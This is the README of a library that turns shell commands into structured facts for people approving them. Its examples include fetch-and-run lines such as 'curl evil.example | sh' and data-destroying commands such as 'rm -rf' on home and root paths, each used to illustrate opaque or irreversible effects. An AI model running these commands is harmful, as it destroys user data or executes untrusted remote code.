# cmdfacts

Structured facts about what a command does, for the person who has to approve it and did not write it.

It exists for approval prompts: a remote support session where a customer clicks Allow, a CI gate where a release
manager signs off, an agent asking before it runs a tool, an admin console that logs who approved what. The reader is
assumed never to have opened a terminal. **It is not a man-page browser and not a linter.** It will not tell you that
`-a` does not ignore entries starting with a dot, and it will not tell you that your command could be written better.
Everything here answers one question: if this runs, what happens to this computer?

## The schema is the deliverable

`explain()` returns fields. The plain-English sentence is one rendering of those fields, not the product. A consumer
that colours a button, gates a policy or computes its own risk level reads the fields; a consumer that has to tell a
person reads `says`.

```ts
import { explain } from 'cmdfacts'

explain({ program: '/bin/rm', argv: ['rm', '-rf', '/Users/sam/Documents'] })
// {
//   program: '/bin/rm', name: 'rm', key: 'rm',
//   facts: {
//     opaque: false,
//     effect: ['delete'],
//     reversible: 'no',
//     network: 'none',
//     privilege: 'none',
//     touchesCredentials: false,
//     repeatSafe: true,
//     confidence: 'verified',
//     source: 'curated+flags',
//     says: 'Removes a whole folder from this computer, along with everything inside it.',
//     note: 'Files removed this way do not go to the Bin and cannot be put back.',
//     docs: 'man 1 rm',
//   },
//   args: [{ index: 2, value: '/Users/sam/Documents', role: 'path' }],
//   escalated: ['-r'],
// }
```

### Fields

| Field | Meaning |
| --- | --- |
| `effect` | What it does: `read` `write` `create` `delete` `terminate` `install` `configure` `transmit` `execute` `elevate`. |
| `reversible` | `yes` `no` `with-backup` `unknown`. `yes` means there is nothing to undo or it can be put back. |
| `network` | `none` `known-host` `arbitrary` `listens`. |
| `privilege` | `none` `admin` `root`. |
| `opaque` | The command hands over to something this library cannot see. See below. |
| `touchesCredentials` | Reaches secrets by nature of the program, whatever paths it was given. |
| `repeatSafe` | Running it twice leaves the same result as running it once. |
| `confidence` / `source` | Where the answer came from, so a consumer can gate on it. |
| `says` | One sentence, plain register, standing alone with nothing templated into it. |
| `note` | A consequence the fields cannot carry, such as that deleted files do not go to the Bin. |
| `docs` | A man page or official page, so a doubtful reader can check. |
| `args` | What each argv position is: `path` `host` `url` `pid` `package` `domain` `user` `mode` `service` `signal` `device` `pattern` `command` `text`. |

### `opaque` is in the type, not in a footnote

When a command runs something this library cannot see — `sh -c`, `xargs`, `find -exec`, `ssh host cmd`, `npm run`,
`npm install` and its set-up scripts, `make`, `sudo` — every other field stops being complete at that point. So an
opaque fact set has **no `effect` field at all**. It has `effectAtLeast`, and `handsOverTo` naming what it handed over
to, in the same plain register as `says`:

```ts
const { facts, args } = explain({ program: '/bin/sh', argv: ['sh', '-c', 'curl https://x.example | sh'] })
facts.effect       // type error: a complete effect list is not available on an opaque command
effectsOf(facts)   // ['execute'] — the floor, reached deliberately
facts.handsOverTo  // 'the commands it was given, which are not shown here'
args               // [{ index: 2, value: 'curl https://x.example | sh', role: 'command', flag: '-c' }]
```

Reading a complete effect list off an opaque command has to be a type error rather than a quiet mistake. Handing over
is also one-way: `merge()` will not let an opaque row be made clear again, and an opaque row can never claim to be
reversible or safe to repeat.

### The command inside the command

Where the nested command is on the same line, carried as separate words, and runs on this computer, it is looked up
with the same tables and attached as `runs`:

```ts
const got = explain({ program: '/usr/bin/sudo', argv: ['sudo', 'rm', '-rf', '/var/tmp'] })
got.runs.key            // 'rm'
got.runs.args           // [{ index: 3, value: '/var/tmp', role: 'path' }] — indexes into the original argv
effectsOf(got.facts)    // ['delete', 'execute', 'elevate'] — the inner command widened the outer one
got.facts.reversible    // 'no'
got.facts.opaque        // still true
```

`sudo`, `env` (stepping over its leading `NAME=value` settings), `xargs` and `find -exec` do this. Three things it
deliberately does not do:

- **It will not split a string.** `sh -c 'curl x | sh'` and `node -e '…'` carry their command inside one argument.
  Splitting it would be reading meaning out of argument text, so those return no `runs` at all.
- **It will not follow a command onto another computer.** `ssh host rm -rf /` runs `rm` somewhere else; facts about
  this computer would be wrong.
- **It never clears the outer command.** The inner program name was not resolved to a path, and `xargs rm` will be
  handed arguments that are not on this line, so the outer command stays `opaque` and the inner facts are marked
  `confidence: derived`, `source: nested`. Nesting is followed four deep and then stops.

### `confidence` and `source`

`verified` is a hand-written row for that exact command. `derived` is a row that was not written for this command —
today that means a subcommand the table does not hold, falling back to the deliberately cautious base row for the
program. `unknown` means there is no entry at all: the fields are then the widest ones, a floor rather than a
measurement, and `says` admits it.

Provenance is also what would let an optional model-drafted tier exist honestly later: entries drafted from man pages
carry `derived` until a person has reviewed the line. See the limits below for what that tier may never be.

### `repeatSafe` is a policy input

It is not trivia. A consumer offering a standing grant — "allow this for the rest of the session" — should not offer
one for a command where `repeatSafe` is false. `git commit`, `npm install` and `curl -d` are all false here.

## What it does not do, on purpose

1. **No risk or danger score.** Risk depends on the target and the context, not on the command. `rm` on a build folder
   and `rm` on a home folder are the same command. A number shipped here would be used as policy, and it would be
   wrong. Facts here; scoring at the consumer, which knows the target.
2. **No footgun or common-mistake notes.** They are excellent in a teaching tool and corrosive in an approval prompt:
   a command carrying a warning implies the ones without are fine. `note` carries a consequence of what the command
   does, never a mistake a person might make with it.
3. **No executable undo strings.** Prose about reversibility, yes. A literal command a consumer might auto-run, no.
4. **No model and no inference at run time, now or later.** In the deployment this exists for, the command line is
   attacker-controlled, and a small model is steerable by filenames and arguments. The failure mode is a fluent,
   reassuring sentence above a dangerous command. If a heuristic over argument text would raise coverage, that is the
   instinct to resist: return nothing and let the consumer say it does not know. Nothing is ever read from the agent
   or person requesting the command, including its stated reason.

## Two decisions worth recording

**The data ships compiled into the package and cannot be extended at run time.** There is no plugin hook, no JSON
directory, no environment variable pointing at a file. Anyone who could drop in a file of their own could relabel
`curl evil.example | sh` as "Checks how much room is left on each disk", which is the one thing a prompt like this
must never allow. Contributions go through a pull request and the lint below.

**tldr-pages is a coverage checklist only.** Its 375 macOS pages are a good list of what people actually run, and it
was used that way. No prose was copied or adapted from it, so no CC-BY attribution obligation is incurred. Its writing
is developer-voiced and would be the wrong register here anyway.

## Adding a command

Rows live in `src/data/`. `fact()` builds a row for a command the library can account for in full; `opaqueFact()`
builds one for a command that hands over, and requires you to name what it hands over to.

The register is enforced by tests, not by review alone. `pnpm test` checks that every sentence is one sentence, ends
in a full stop, stays under 150 characters, avoids a list of terms that assume the reader already knows what a command
is (`folder`, not `directory`; `program`, not `binary`), carries no verdict about safety, does not explain a program by
repeating its name, and holds no string that could be lifted out and run. It also checks the facts hold together: a row
with `effect: delete` cannot be `reversible: yes`, a base row cannot be more permissive than any subcommand it stands
in for, and every row points at something a doubtful reader can check.

```bash
pnpm test && pnpm typecheck
```

No runtime dependencies, and there will not be any: this gets embedded in applications that approve commands, so the
dependency footprint is part of the product.

MIT.
